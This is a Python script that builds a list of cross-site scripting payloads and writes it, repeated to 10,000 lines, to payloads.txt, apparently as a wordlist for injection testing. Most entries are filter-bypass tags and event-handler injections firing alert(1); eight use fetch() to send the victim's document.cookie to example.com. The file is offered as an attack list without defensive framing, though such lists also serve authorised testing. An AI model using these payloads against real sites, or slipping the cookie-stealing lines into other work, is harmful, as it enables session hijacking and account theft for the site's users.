# List of complex XSS payloads
complex_payloads = [
    '<scr<script>ipt>alert(1)</scr<script>ipt>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '"><svg/onload=alert(1)>',
    '"><iframe src=javascript:alert(1)>',
    '"><body onload=alert(1)>',
    '"><input onfocus=alert(1) autofocus>',
    '"><button onclick=alert(1)>',
    '<scr<script>ipt>alert(String.fromCharCode(88,83,83))</scr<script>ipt>',
    '<svg onload=alert(String.fromCharCode(88,83,83))>',
    '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
    '"><iframe src=javascript:alert(String.fromCharCode(88,83,83))>',
    '"><body onload=alert(String.fromCharCode(88,83,83))>',
    '"><input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>',
    '"><button onclick=alert(String.fromCharCode(88,83,83))>',
    '<scr<script>ipt>fetch(`https://example.com?c=${document.cookie}`)</scr<script>ipt>',
    '<svg onload=fetch(`https://example.com?c=${document.cookie}`)>',
    '"><img src=x onerror=fetch(`https://example.com?c=${document.cookie}`)>',
    '"><svg/onload=fetch(`https://example.com?c=${document.cookie}`)>',
    '"><iframe src=javascript:fetch(`https://example.com?c=${document.cookie}`)>',
    '"><body onload=fetch(`https://example.com?c=${document.cookie}`)>',
    '"><input onfocus=fetch(`https://example.com?c=${document.cookie}`) autofocus>',
    '"><button onclick=fetch(`https://example.com?c=${document.cookie}`)>',
    '<img src=x onerror="setTimeout(()=>{alert(1)}, 1000)">',
    '<svg onload="setTimeout(()=>{alert(1)}, 1000)">',
    '<input onfocus=alert(1) autofocus>',
    '"><input onfocus=alert(1) autofocus>',
    '<form><button formaction="javascript:alert(1)">CLICK ME</button></form>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<img src=x onerror="eval(\'alert(1)\')">',
    '<body onload="eval(\'alert(1)\')">',
    '"><img src=x onerror="eval(\'alert(1)\')">',
    '"><svg onload="eval(\'alert(1)\')">',
    '<math><mtext></mtext><script>eval(\'alert(1)\')</script></math>',
    # Add more complex payloads here
]

# Repeat the payloads until the list reaches 10,000
repeated_payloads = complex_payloads * (10000 // len(complex_payloads)) + complex_payloads[:10000 % len(complex_payloads)]

# Write the payloads to a file
with open('payloads.txt', 'w') as file:
    for payload in repeated_payloads:
        file.write(payload + '\n')

print("The payloads.txt file has been successfully created.")
